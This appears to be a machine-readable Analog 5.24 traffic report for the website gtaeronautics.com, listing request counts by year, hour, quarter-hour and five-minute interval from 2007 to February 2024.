x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	02	16	02	08
x	FR	2007	12	18	17	05
x	LR	2024	02	15	05	58
x	E7	2024	02	16	02	08
x	SR	1706440
x	S7	8778
x	NC	599604
x	C7	0
x	FL	635307
x	F7	415
x	RR	254
x	R7	0
x	NH	109723
x	H7	381
x	BT	57520368399
x	B7	0
1	Rr	102234	5.991	2024
1	Rr	511208	29.958	2023
1	Rr	82334	4.825	2022
1	Rr	98917	5.797	2021
1	Rr	89380	5.238	2020
1	Rr	80088	4.693	2019
1	Rr	68927	4.039	2018
1	Rr	60168	3.526	2017
1	Rr	73316	4.296	2016
1	Rr	80796	4.735	2015
1	Rr	110773	6.491	2014
1	Rr	65173	3.819	2013
1	Rr	60742	3.560	2012
1	Rr	57015	3.341	2011
1	Rr	22139	1.297	2010
1	Rr	69710	4.085	2009
1	Rr	71820	4.209	2008
1	Rr	1700	0.100	2007
1	*BT	R	511208	2023
4	Rr	0	0.000	2024	02	14	07	15
4	Rr	2	0.000	2024	02	14	07	00
4	Rr	1	0.000	2024	02	14	06	45
4	Rr	119	0.007	2024	02	14	06	30
4	Rr	1	0.000	2024	02	14	06	15
4	Rr	5	0.000	2024	02	14	06	00
4	*BT	R	975	2023	05	08	18	00
6	Rr	16794	0.984	00	00
6	Rr	15753	0.923	00	15
6	Rr	17035	0.998	00	30
6	Rr	16846	0.987	00	45
6	Rr	15146	0.888	01	00
6	Rr	16356	0.958	01	15
6	Rr	15682	0.919	01	30
6	Rr	16975	0.995	01	45
6	Rr	14538	0.852	02	00
6	Rr	17507	1.026	02	15
6	Rr	16877	0.989	02	30
6	Rr	16285	0.954	02	45
6	Rr	15830	0.928	03	00
6	Rr	15665	0.918	03	15
6	Rr	15998	0.938	03	30
6	Rr	18587	1.089	03	45
6	Rr	15797	0.926	04	00
6	Rr	15195	0.890	04	15
6	Rr	16453	0.964	04	30
6	Rr	17585	1.031	04	45
6	Rr	15402	0.903	05	00
6	Rr	16517	0.968	05	15
6	Rr	14880	0.872	05	30
6	Rr	15652	0.917	05	45
6	Rr	16087	0.943	06	00
6	Rr	14433	0.846	06	15
6	Rr	15013	0.880	06	30
6	Rr	13537	0.793	06	45
6	Rr	15235	0.893	07	00
6	Rr	15100	0.885	07	15
6	Rr	14400	0.844	07	30
6	Rr	14148	0.829	07	45
6	Rr	13815	0.810	08	00
6	Rr	14060	0.824	08	15
6	Rr	14836	0.869	08	30
6	Rr	12952	0.759	08	45
6	Rr	12349	0.724	09	00
6	Rr	12732	0.746	09	15
6	Rr	14683	0.860	09	30
6	Rr	12194	0.715	09	45
6	Rr	12907	0.756	10	00
6	Rr	14014	0.821	10	15
6	Rr	15289	0.896	10	30
6	Rr	14508	0.850	10	45
6	Rr	16540	0.969	11	00
6	Rr	14817	0.868	11	15
6	Rr	15261	0.894	11	30
6	Rr	13245	0.776	11	45
6	Rr	15630	0.916	12	00
6	Rr	13948	0.817	12	15
6	Rr	13898	0.814	12	30
6	Rr	15562	0.912	12	45
6	Rr	14788	0.867	13	00
6	Rr	17572	1.030	13	15
6	Rr	16832	0.986	13	30
6	Rr	15589	0.914	13	45
6	Rr	18743	1.098	14	00
6	Rr	21704	1.272	14	15
6	Rr	20326	1.191	14	30
6	Rr	19021	1.115	14	45
6	Rr	19890	1.166	15	00
6	Rr	19945	1.169	15	15
6	Rr	22776	1.335	15	30
6	Rr	21949	1.286	15	45
6	Rr	23152	1.357	16	00
6	Rr	24045	1.409	16	15
6	Rr	22669	1.328	16	30
6	Rr	23351	1.368	16	45
6	Rr	24777	1.452	17	00
6	Rr	23791	1.394	17	15
6	Rr	23761	1.392	17	30
6	Rr	22559	1.322	17	45
6	Rr	24929	1.461	18	00
6	Rr	22351	1.310	18	15
6	Rr	23203	1.360	18	30
6	Rr	23714	1.390	18	45
6	Rr	22938	1.344	19	00
6	Rr	20825	1.220	19	15
6	Rr	22601	1.324	19	30
6	Rr	24649	1.444	19	45
6	Rr	21787	1.277	20	00
6	Rr	22809	1.337	20	15
6	Rr	21087	1.236	20	30
6	Rr	22579	1.323	20	45
6	Rr	21124	1.238	21	00
6	Rr	21124	1.238	21	15
6	Rr	19299	1.131	21	30
6	Rr	21027	1.232	21	45
6	Rr	17635	1.033	22	00
6	Rr	18197	1.066	22	15
6	Rr	18242	1.069	22	30
6	Rr	17928	1.051	22	45
6	Rr	19164	1.123	23	00
6	Rr	19418	1.138	23	15
6	Rr	15377	0.901	23	30
6	Rr	16645	0.975	23	45
5	Rr	2	0.000	2024	02	15	05	55
5	Rr	0	0.000	2024	02	15	05	50
5	Rr	0	0.000	2024	02	15	05	45
5	Rr	0	0.000	2024	02	15	05	40
5	Rr	1	0.000	2024	02	15	05	35
5	Rr	0	0.000	2024	02	15	05	30
5	Rr	1	0.000	2024	02	15	05	25
5	Rr	0	0.000	2024	02	15	05	20
5	Rr	0	0.000	2024	02	15	05	15
5	Rr	0	0.000	2024	02	15	05	10
5	Rr	0	0.000	2024	02	15	05	05
5	Rr	1	0.000	2024	02	15	05	00
5	Rr	0	0.000	2024	02	15	04	55
5	Rr	1	0.000	2024	02	15	04	50
5	Rr	0	0.000	2024	02	15	04	45
5	Rr	0	0.000	2024	02	15	04	40
5	Rr	0	0.000	2024	02	15	04	35
5	Rr	0	0.000	2024	02	15	04	30
5	Rr	0	0.000	2024	02	15	04	25
5	Rr	0	0.000	2024	02	15	04	20
5	Rr	3	0.000	2024	02	15	04	15
5	Rr	0	0.000	2024	02	15	04	10
5	Rr	3	0.000	2024	02	15	04	05
5	Rr	0	0.000	2024	02	15	04	00
5	Rr	32	0.002	2024	02	15	03	55
5	Rr	0	0.000	2024	02	15	03	50
5	Rr	1	0.000	2024	02	15	03	45
5	Rr	0	0.000	2024	02	15	03	40
5	Rr	1	0.000	2024	02	15	03	35
5	Rr	0	0.000	2024	02	15	03	30
5	Rr	1	0.000	2024	02	15	03	25
5	Rr	0	0.000	2024	02	15	03	20
5	Rr	0	0.000	2024	02	15	03	15
5	Rr	0	0.000	2024	02	15	03	10
5	Rr	1	0.000	2024	02	15	03	05
5	Rr	2	0.000	2024	02	15	03	00
5	Rr	1	0.000	2024	02	15	02	55
5	Rr	1	0.000	2024	02	15	02	50
5	Rr	0	0.000	2024	02	15	02	45
5	Rr	0	0.000	2024	02	15	02	40
5	Rr	1	0.000	2024	02	15	02	35
5	Rr	2	0.000	2024	02	15	02	30
5	Rr	0	0.000	2024	02	15	02	25
5	Rr	0	0.000	2024	02	15	02	20
5	Rr	1	0.000	2024	02	15	02	15
5	Rr	1	0.000	2024	02	15	02	10
5	Rr	1	0.000	2024	02	15	02	05
5	Rr	2	0.000	2024	02	15	02	00
5	Rr	0	0.000	2024	02	15	01	55
5	Rr	32	0.002	2024	02	15	01	50
5	Rr	0	0.000	2024	02	15	01	45
5	Rr	1	0.000	2024	02	15	01	40
5	Rr	0	0.000	2024	02	15	01	35
5	Rr	1	0.000	2024	02	15	01	30
5	Rr	0	0.000	2024	02	15	01	25
5	Rr	1	0.000	2024	02	15	01	20
5	Rr	0	0.000	2024	02	15	01	15
5	Rr	0	0.000	2024	02	15	01	10
5	Rr	2	0.000	2024	02	15	01	05
5	Rr	0	0.000	2024	02	15	01	00
5	Rr	0	0.000	2024	02	15	00	55
5	Rr	2	0.000	2024	02	15	00	50
5	Rr	2	0.000	2024	02	15	00	45
5	Rr	0	0.000	2024	02	15	00	40
5	Rr	0	0.000	2024	02	15	00	35
5	Rr	1	0.000	2024	02	15	00	30
5	Rr	5	0.000	2024	02	15	00	25
5	Rr	0	0.000	2024	02	15	00	20
5	Rr	0	0.000	2024	02	15	00	15
5	Rr	0	0.000	2024	02	15	00	10
5	Rr	0	0.000	2024	02	15	00	05
5	Rr	0	0.000	2024	02	15	00	00
5	Rr	0	0.000	2024	02	14	23	55
5	Rr	1	0.000	2024	02	14	23	50
5	Rr	0	0.000	2024	02	14	23	45
5	Rr	1	0.000	2024	02	14	23	40
5	Rr	0	0.000	2024	02	14	23	35
5	Rr	0	0.000	2024	02	14	23	30
5	Rr	0	0.000	2024	02	14	23	25
5	Rr	0	0.000	2024	02	14	23	20
5	Rr	0	0.000	2024	02	14	23	15
5	Rr	0	0.000	2024	02	14	23	10
5	Rr	0	0.000	2024	02	14	23	05
5	Rr	23	0.001	2024	02	14	23	00
5	Rr	3	0.000	2024	02	14	22	55
5	Rr	0	0.000	2024	02	14	22	50
5	Rr	6	0.000	2024	02	14	22	45
5	Rr	41	0.002	2024	02	14	22	40
5	Rr	32	0.002	2024	02	14	22	35
5	Rr	0	0.000	2024	02	14	22	30
5	Rr	1	0.000	2024	02	14	22	25
5	Rr	0	0.000	2024	02	14	22	20
5	Rr	0	0.000	2024	02	14	22	15
5	Rr	0	0.000	2024	02	14	22	10
5	Rr	0	0.000	2024	02	14	22	05
5	Rr	0	0.000	2024	02	14	22	00
5	Rr	0	0.000	2024	02	14	21	55
5	Rr	1	0.000	2024	02	14	21	50
5	Rr	0	0.000	2024	02	14	21	45
5	Rr	0	0.000	2024	02	14	21	40
5	Rr	0	0.000	2024	02	14	21	35
5	Rr	1	0.000	2024	02	14	21	30
5	Rr	1	0.000	2024	02	14	21	25
5	Rr	1	0.000	2024	02	14	21	20
5	Rr	0	0.000	2024	02	14	21	15
5	Rr	0	0.000	2024	02	14	21	10
5	Rr	1	0.000	2024	02	14	21	05
5	Rr	0	0.000	2024	02	14	21	00
5	Rr	3	0.000	2024	02	14	20	55
5	Rr	0	0.000	2024	02	14	20	50
5	Rr	0	0.000	2024	02	14	20	45
5	Rr	0	0.000	2024	02	14	20	40
5	Rr	0	0.000	2024	02	14	20	35
5	Rr	0	0.000	2024	02	14	20	30
5	Rr	0	0.000	2024	02	14	20	25
5	Rr	1	0.000	2024	02	14	20	20
5	Rr	1	0.000	2024	02	14	20	15
5	Rr	0	0.000	2024	02	14	20	10
5	Rr	1	0.000	2024	02	14	20	05
5	Rr	5	0.000	2024	02	14	20	00
5	Rr	1	0.000	2024	02	14	19	55
5	Rr	1	0.000	2024	02	14	19	50
5	Rr	2	0.000	2024	02	14	19	45
5	Rr	1	0.000	2024	02	14	19	40
5	Rr	0	0.000	2024	02	14	19	35
5	Rr	2	0.000	2024	02	14	19	30
5	Rr	1	0.000	2024	02	14	19	25
5	Rr	0	0.000	2024	02	14	19	20
5	Rr	1	0.000	2024	02	14	19	15
5	Rr	2	0.000	2024	02	14	19	10
5	Rr	0	0.000	2024	02	14	19	05
5	Rr	0	0.000	2024	02	14	19	00
5	Rr	0	0.000	2024	02	14	18	55
5	Rr	2	0.000	2024	02	14	18	50
5	Rr	0	0.000	2024	02	14	18	45
5	Rr	3	0.000	2024	02	14	18	40
5	Rr	0	0.000	2024	02	14	18	35
5	Rr	1	0.000	2024	02	14	18	30
5	Rr	0	0.000	2024	02	14	18	25
5	Rr	1	0.000	2024	02	14	18	20
5	Rr	0	0.000	2024	02	14	18	15
5	Rr	0	0.000	2024	02	14	18	10
5	Rr	0	0.000	2024	02	14	18	05
5	Rr	0	0.000	2024	02	14	18	00
5	Rr	0	0.000	2024	02	14	17	55
5	Rr	0	0.000	2024	02	14	17	50
5	Rr	1	0.000	2024	02	14	17	45
5	Rr	0	0.000	2024	02	14	17	40
5	Rr	0	0.000	2024	02	14	17	35
5	Rr	0	0.000	2024	02	14	17	30
5	Rr	0	0.000	2024	02	14	17	25
5	Rr	0	0.000	2024	02	14	17	20
5	Rr	0	0.000	2024	02	14	17	15
5	Rr	1	0.000	2024	02	14	17	10
5	Rr	0	0.000	2024	02	14	17	05
5	Rr	0	0.000	2024	02	14	17	00
5	Rr	0	0.000	2024	02	14	16	55
5	Rr	0	0.000	2024	02	14	16	50
5	Rr	0	0.000	2024	02	14	16	45
5	Rr	0	0.000	2024	02	14	16	40
5	Rr	0	0.000	2024	02	14	16	35
5	Rr	0	0.000	2024	02	14	16	30
5	Rr	0	0.000	2024	02	14	16	25
5	Rr	3	0.000	2024	02	14	16	20
5	Rr	0	0.000	2024	02	14	16	15
5	Rr	1	0.000	2024	02	14	16	10
5	Rr	0	0.000	2024	02	14	16	05
5	Rr	1	0.000	2024	02	14	16	00
5	Rr	0	0.000	2024	02	14	15	55
5	Rr	3	0.000	2024	02	14	15	50
5	Rr	1	0.000	2024	02	14	15	45
5	Rr	0	0.000	2024	02	14	15	40
5	Rr	0	0.000	2024	02	14	15	35
5	Rr	0	0.000	2024	02	14	15	30
5	Rr	0	0.000	2024	02	14	15	25
5	Rr	0	0.000	2024	02	14	15	20
5	Rr	0	0.000	2024	02	14	15	15
5	Rr	0	0.000	2024	02	14	15	10
5	Rr	0	0.000	2024	02	14	15	05
5	Rr	0	0.000	2024	02	14	15	00
5	Rr	0	0.000	2024	02	14	14	55
5	Rr	1	0.000	2024	02	14	14	50
5	Rr	0	0.000	2024	02	14	14	45
5	Rr	0	0.000	2024	02	14	14	40
5	Rr	0	0.000	2024	02	14	14	35
5	Rr	0	0.000	2024	02	14	14	30
5	Rr	0	0.000	2024	02	14	14	25
5	Rr	0	0.000	2024	02	14	14	20
5	Rr	0	0.000	2024	02	14	14	15
5	Rr	0	0.000	2024	02	14	14	10
5	Rr	2	0.000	2024	02	14	14	05
5	Rr	0	0.000	2024	02	14	14	00
5	Rr	0	0.000	2024	02	14	13	55
5	Rr	0	0.000	2024	02	14	13	50
5	Rr	0	0.000	2024	02	14	13	45
5	Rr	0	0.000	2024	02	14	13	40
5	Rr	0	0.000	2024	02	14	13	35
5	Rr	0	0.000	2024	02	14	13	30
5	Rr	0	0.000	2024	02	14	13	25
5	Rr	1	0.000	2024	02	14	13	20
5	Rr	1	0.000	2024	02	14	13	15
5	Rr	0	0.000	2024	02	14	13	10
5	Rr	0	0.000	2024	02	14	13	05
5	Rr	0	0.000	2024	02	14	13	00
5	Rr	0	0.000	2024	02	14	12	55
5	Rr	0	0.000	2024	02	14	12	50
5	Rr	0	0.000	2024	02	14	12	45
5	Rr	0	0.000	2024	02	14	12	40
5	Rr	1	0.000	2024	02	14	12	35
5	Rr	0	0.000	2024	02	14	12	30
5	Rr	3	0.000	2024	02	14	12	25
5	Rr	0	0.000	2024	02	14	12	20
5	Rr	1	0.000	2024	02	14	12	15
5	Rr	0	0.000	2024	02	14	12	10
5	Rr	1	0.000	2024	02	14	12	05
5	Rr	1	0.000	2024	02	14	12	00
5	Rr	0	0.000	2024	02	14	11	55
5	Rr	0	0.000	2024	02	14	11	50
5	Rr	0	0.000	2024	02	14	11	45
5	Rr	1	0.000	2024	02	14	11	40
5	Rr	0	0.000	2024	02	14	11	35
5	Rr	1	0.000	2024	02	14	11	30
5	Rr	0	0.000	2024	02	14	11	25
5	Rr	0	0.000	2024	02	14	11	20
5	Rr	1	0.000	2024	02	14	11	15
5	Rr	3	0.000	2024	02	14	11	10
5	Rr	2	0.000	2024	02	14	11	05
5	Rr	0	0.000	2024	02	14	11	00
5	Rr	0	0.000	2024	02	14	10	55
5	Rr	0	0.000	2024	02	14	10	50
5	Rr	0	0.000	2024	02	14	10	45
5	Rr	0	0.000	2024	02	14	10	40
5	Rr	0	0.000	2024	02	14	10	35
5	Rr	0	0.000	2024	02	14	10	30
5	Rr	0	0.000	2024	02	14	10	25
5	Rr	0	0.000	2024	02	14	10	20
5	Rr	0	0.000	2024	02	14	10	15
5	Rr	86	0.005	2024	02	14	10	10
5	Rr	0	0.000	2024	02	14	10	05
5	Rr	0	0.000	2024	02	14	10	00
5	Rr	0	0.000	2024	02	14	09	55
5	Rr	0	0.000	2024	02	14	09	50
5	Rr	0	0.000	2024	02	14	09	45
5	Rr	1	0.000	2024	02	14	09	40
5	Rr	0	0.000	2024	02	14	09	35
5	Rr	0	0.000	2024	02	14	09	30
5	Rr	0	0.000	2024	02	14	09	25
5	Rr	0	0.000	2024	02	14	09	20
5	Rr	0	0.000	2024	02	14	09	15
5	Rr	0	0.000	2024	02	14	09	10
5	Rr	0	0.000	2024	02	14	09	05
5	Rr	0	0.000	2024	02	14	09	00
5	Rr	0	0.000	2024	02	14	08	55
5	Rr	0	0.000	2024	02	14	08	50
5	Rr	0	0.000	2024	02	14	08	45
5	Rr	0	0.000	2024	02	14	08	40
5	Rr	0	0.000	2024	02	14	08	35
5	Rr	0	0.000	2024	02	14	08	30
5	Rr	0	0.000	2024	02	14	08	25
5	Rr	0	0.000	2024	02	14	08	20
5	Rr	0	0.000	2024	02	14	08	15
5	Rr	0	0.000	2024	02	14	08	10
5	Rr	1	0.000	2024	02	14	08	05
5	Rr	1	0.000	2024	02	14	08	00
5	Rr	0	0.000	2024	02	14	07	55
5	Rr	0	0.000	2024	02	14	07	50
5	Rr	0	0.000	2024	02	14	07	45
5	Rr	1	0.000	2024	02	14	07	40
5	Rr	1	0.000	2024	02	14	07	35
5	Rr	0	0.000	2024	02	14	07	30
5	Rr	0	0.000	2024	02	14	07	25
5	Rr	0	0.000	2024	02	14	07	20
5	Rr	0	0.000	2024	02	14	07	15
5	Rr	0	0.000	2024	02	14	07	10
5	Rr	2	0.000	2024	02	14	07	05
5	Rr	0	0.000	2024	02	14	07	00
5	Rr	0	0.000	2024	02	14	06	55
5	Rr	1	0.000	2024	02	14	06	50
5	Rr	0	0.000	2024	02	14	06	45
5	Rr	1	0.000	2024	02	14	06	40
5	Rr	8	0.000	2024	02	14	06	35
5	Rr	110	0.006	2024	02	14	06	30
5	Rr	0	0.000	2024	02	14	06	25
5	Rr	1	0.000	2024	02	14	06	20
5	Rr	0	0.000	2024	02	14	06	15
5	Rr	3	0.000	2024	02	14	06	10
5	Rr	2	0.000	2024	02	14	06	05
5	Rr	0	0.000	2024	02	14	06	00
5	*BT	R	945	2023	05	08	18	00
7	Rr	5953	0.349	00	00
7	Rr	4956	0.290	00	05
7	Rr	5885	0.345	00	10
7	Rr	4162	0.244	00	15
7	Rr	5369	0.315	00	20
7	Rr	6222	0.365	00	25
7	Rr	5344	0.313	00	30
7	Rr	6242	0.366	00	35
7	Rr	5449	0.319	00	40
7	Rr	5388	0.316	00	45
7	Rr	5866	0.344	00	50
7	Rr	5592	0.328	00	55
7	Rr	5508	0.323	01	00
7	Rr	4963	0.291	01	05
7	Rr	4675	0.274	01	10
7	Rr	5242	0.307	01	15
7	Rr	5781	0.339	01	20
7	Rr	5333	0.313	01	25
7	Rr	4966	0.291	01	30
7	Rr	5211	0.305	01	35
7	Rr	5505	0.323	01	40
7	Rr	5290	0.310	01	45
7	Rr	6230	0.365	01	50
7	Rr	5455	0.320	01	55
7	Rr	5025	0.294	02	00
7	Rr	4672	0.274	02	05
7	Rr	4841	0.284	02	10
7	Rr	6178	0.362	02	15
7	Rr	5515	0.323	02	20
7	Rr	5814	0.341	02	25
7	Rr	5842	0.342	02	30
7	Rr	5510	0.323	02	35
7	Rr	5525	0.324	02	40
7	Rr	4714	0.276	02	45
7	Rr	5673	0.332	02	50
7	Rr	5898	0.346	02	55
7	Rr	5792	0.339	03	00
7	Rr	4931	0.289	03	05
7	Rr	5107	0.299	03	10
7	Rr	5000	0.293	03	15
7	Rr	5341	0.313	03	20
7	Rr	5324	0.312	03	25
7	Rr	5394	0.316	03	30
7	Rr	5384	0.316	03	35
7	Rr	5220	0.306	03	40
7	Rr	6059	0.355	03	45
7	Rr	6836	0.401	03	50
7	Rr	5692	0.334	03	55
7	Rr	5310	0.311	04	00
7	Rr	5289	0.310	04	05
7	Rr	5198	0.305	04	10
7	Rr	5423	0.318	04	15
7	Rr	4618	0.271	04	20
7	Rr	5154	0.302	04	25
7	Rr	5160	0.302	04	30
7	Rr	5141	0.301	04	35
7	Rr	6152	0.361	04	40
7	Rr	5618	0.329	04	45
7	Rr	5892	0.345	04	50
7	Rr	6075	0.356	04	55
7	Rr	5317	0.312	05	00
7	Rr	5215	0.306	05	05
7	Rr	4870	0.285	05	10
7	Rr	6076	0.356	05	15
7	Rr	5383	0.315	05	20
7	Rr	5058	0.296	05	25
7	Rr	5007	0.293	05	30
7	Rr	5004	0.293	05	35
7	Rr	4869	0.285	05	40
7	Rr	5350	0.314	05	45
7	Rr	5008	0.293	05	50
7	Rr	5294	0.310	05	55
7	Rr	4730	0.277	06	00
7	Rr	5945	0.348	06	05
7	Rr	5412	0.317	06	10
7	Rr	5436	0.319	06	15
7	Rr	4188	0.245	06	20
7	Rr	4809	0.282	06	25
7	Rr	5334	0.313	06	30
7	Rr	4989	0.292	06	35
7	Rr	4690	0.275	06	40
7	Rr	4704	0.276	06	45
7	Rr	4669	0.274	06	50
7	Rr	4164	0.244	06	55
7	Rr	6022	0.353	07	00
7	Rr	4457	0.261	07	05
7	Rr	4756	0.279	07	10
7	Rr	4573	0.268	07	15
7	Rr	5449	0.319	07	20
7	Rr	5078	0.298	07	25
7	Rr	4938	0.289	07	30
7	Rr	4913	0.288	07	35
7	Rr	4549	0.267	07	40
7	Rr	5467	0.320	07	45
7	Rr	4234	0.248	07	50
7	Rr	4447	0.261	07	55
7	Rr	4773	0.280	08	00
7	Rr	4405	0.258	08	05
7	Rr	4637	0.272	08	10
7	Rr	4438	0.260	08	15
7	Rr	4706	0.276	08	20
7	Rr	4916	0.288	08	25
7	Rr	4796	0.281	08	30
7	Rr	4953	0.290	08	35
7	Rr	5087	0.298	08	40
7	Rr	4786	0.280	08	45
7	Rr	4249	0.249	08	50
7	Rr	3917	0.230	08	55
7	Rr	4284	0.251	09	00
7	Rr	4123	0.242	09	05
7	Rr	3942	0.231	09	10
7	Rr	3445	0.202	09	15
7	Rr	4243	0.249	09	20
7	Rr	5044	0.296	09	25
7	Rr	4381	0.257	09	30
7	Rr	4900	0.287	09	35
7	Rr	5402	0.317	09	40
7	Rr	4051	0.237	09	45
7	Rr	3929	0.230	09	50
7	Rr	4214	0.247	09	55
7	Rr	4412	0.259	10	00
7	Rr	4006	0.235	10	05
7	Rr	4489	0.263	10	10
7	Rr	4010	0.235	10	15
7	Rr	4857	0.285	10	20
7	Rr	5147	0.302	10	25
7	Rr	4813	0.282	10	30
7	Rr	5325	0.312	10	35
7	Rr	5151	0.302	10	40
7	Rr	4086	0.239	10	45
7	Rr	5674	0.333	10	50
7	Rr	4748	0.278	10	55
7	Rr	6294	0.369	11	00
7	Rr	5136	0.301	11	05
7	Rr	5110	0.299	11	10
7	Rr	4640	0.272	11	15
7	Rr	4179	0.245	11	20
7	Rr	5998	0.351	11	25
7	Rr	6446	0.378	11	30
7	Rr	4297	0.252	11	35
7	Rr	4518	0.265	11	40
7	Rr	4804	0.282	11	45
7	Rr	4350	0.255	11	50
7	Rr	4091	0.240	11	55
7	Rr	5055	0.296	12	00
7	Rr	5300	0.311	12	05
7	Rr	5275	0.309	12	10
7	Rr	4380	0.257	12	15
7	Rr	4714	0.276	12	20
7	Rr	4854	0.284	12	25
7	Rr	4362	0.256	12	30
7	Rr	4835	0.283	12	35
7	Rr	4701	0.275	12	40
7	Rr	4821	0.283	12	45
7	Rr	5343	0.313	12	50
7	Rr	5398	0.316	12	55
7	Rr	5030	0.295	13	00
7	Rr	4502	0.264	13	05
7	Rr	5256	0.308	13	10
7	Rr	5925	0.347	13	15
7	Rr	6081	0.356	13	20
7	Rr	5566	0.326	13	25
7	Rr	4995	0.293	13	30
7	Rr	5686	0.333	13	35
7	Rr	6151	0.360	13	40
7	Rr	4168	0.244	13	45
7	Rr	5923	0.347	13	50
7	Rr	5498	0.322	13	55
7	Rr	6052	0.355	14	00
7	Rr	6480	0.380	14	05
7	Rr	6211	0.364	14	10
7	Rr	7707	0.452	14	15
7	Rr	7240	0.424	14	20
7	Rr	6757	0.396	14	25
7	Rr	6959	0.408	14	30
7	Rr	6326	0.371	14	35
7	Rr	7041	0.413	14	40
7	Rr	6258	0.367	14	45
7	Rr	5518	0.323	14	50
7	Rr	7245	0.425	14	55
7	Rr	7295	0.427	15	00
7	Rr	5886	0.345	15	05
7	Rr	6709	0.393	15	10
7	Rr	5780	0.339	15	15
7	Rr	7349	0.431	15	20
7	Rr	6816	0.399	15	25
7	Rr	7108	0.417	15	30
7	Rr	7180	0.421	15	35
7	Rr	8488	0.497	15	40
7	Rr	6269	0.367	15	45
7	Rr	7819	0.458	15	50
7	Rr	7861	0.461	15	55
7	Rr	7267	0.426	16	00
7	Rr	7823	0.458	16	05
7	Rr	8062	0.472	16	10
7	Rr	8736	0.512	16	15
7	Rr	8042	0.471	16	20
7	Rr	7267	0.426	16	25
7	Rr	7161	0.420	16	30
7	Rr	8027	0.470	16	35
7	Rr	7481	0.438	16	40
7	Rr	7994	0.468	16	45
7	Rr	8490	0.498	16	50
7	Rr	6867	0.402	16	55
7	Rr	8161	0.478	17	00
7	Rr	8406	0.493	17	05
7	Rr	8210	0.481	17	10
7	Rr	7340	0.430	17	15
7	Rr	8420	0.493	17	20
7	Rr	8031	0.471	17	25
7	Rr	8668	0.508	17	30
7	Rr	7356	0.431	17	35
7	Rr	7737	0.453	17	40
7	Rr	7597	0.445	17	45
7	Rr	7476	0.438	17	50
7	Rr	7486	0.439	17	55
7	Rr	9363	0.549	18	00
7	Rr	7897	0.463	18	05
7	Rr	7669	0.449	18	10
7	Rr	7993	0.468	18	15
7	Rr	6718	0.394	18	20
7	Rr	7640	0.448	18	25
7	Rr	7465	0.437	18	30
7	Rr	6794	0.398	18	35
7	Rr	8944	0.524	18	40
7	Rr	7121	0.417	18	45
7	Rr	8983	0.526	18	50
7	Rr	7610	0.446	18	55
7	Rr	7880	0.462	19	00
7	Rr	7324	0.429	19	05
7	Rr	7734	0.453	19	10
7	Rr	7008	0.411	19	15
7	Rr	6671	0.391	19	20
7	Rr	7146	0.419	19	25
7	Rr	6909	0.405	19	30
7	Rr	8667	0.508	19	35
7	Rr	7025	0.412	19	40
7	Rr	8251	0.484	19	45
7	Rr	7889	0.462	19	50
7	Rr	8509	0.499	19	55
7	Rr	7788	0.456	20	00
7	Rr	7217	0.423	20	05
7	Rr	6782	0.397	20	10
7	Rr	6928	0.406	20	15
7	Rr	8409	0.493	20	20
7	Rr	7472	0.438	20	25
7	Rr	6948	0.407	20	30
7	Rr	7493	0.439	20	35
7	Rr	6646	0.389	20	40
7	Rr	7955	0.466	20	45
7	Rr	7770	0.455	20	50
7	Rr	6854	0.402	20	55
7	Rr	7533	0.441	21	00
7	Rr	7040	0.413	21	05
7	Rr	6551	0.384	21	10
7	Rr	7068	0.414	21	15
7	Rr	6735	0.395	21	20
7	Rr	7321	0.429	21	25
7	Rr	5765	0.338	21	30
7	Rr	7423	0.435	21	35
7	Rr	6111	0.358	21	40
7	Rr	8284	0.485	21	45
7	Rr	7287	0.427	21	50
7	Rr	5456	0.320	21	55
7	Rr	5809	0.340	22	00
7	Rr	5783	0.339	22	05
7	Rr	6043	0.354	22	10
7	Rr	6255	0.367	22	15
7	Rr	6344	0.372	22	20
7	Rr	5598	0.328	22	25
7	Rr	6123	0.359	22	30
7	Rr	6505	0.381	22	35
7	Rr	5614	0.329	22	40
7	Rr	6804	0.399	22	45
7	Rr	5744	0.337	22	50
7	Rr	5380	0.315	22	55
7	Rr	6160	0.361	23	00
7	Rr	6279	0.368	23	05
7	Rr	6725	0.394	23	10
7	Rr	6765	0.396	23	15
7	Rr	6719	0.394	23	20
7	Rr	5934	0.348	23	25
7	Rr	4845	0.284	23	30
7	Rr	5210	0.305	23	35
7	Rr	5322	0.312	23	40
7	Rr	4845	0.284	23	45
7	Rr	5903	0.346	23	50
7	Rr	5897	0.346	23	55
o	*f	0R	r
o	lRQ	1	1706440	3838599433	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	81907	3.582	98
Z	lRb	1	76310	2.566	66.249
Z	lRb	1	55369	2.524	51
Z	lRb	1	50981	1.794	34
Z	lRb	1	47496	2.025	35
Z	lRb	1	43935	1.401	69
Z	lRb	1	32440	0.506	49
